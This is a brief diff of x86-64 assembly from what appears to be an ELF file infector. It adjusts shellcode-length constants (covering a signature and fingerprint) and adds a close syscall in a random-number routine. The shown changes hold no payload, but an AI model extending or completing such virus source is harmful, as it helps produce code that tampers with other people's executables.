@@ -1718,9 +1718,9 @@ push rdx
 	NOP
 retn
 
-%define SHELLCODE_LEN 9530 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 9362 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 9357 
+%define SHELLCODE_LEN 9537 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 9369 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 9364 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	NOP
@@ -3417,6 +3417,8 @@ ft_rand:
 	mov rdx, 1
 	mov rax, 0
 	syscall;read
+	mov rax, 3
+	syscall; close(fd);
 	NOP
 	NOP
 	NOP
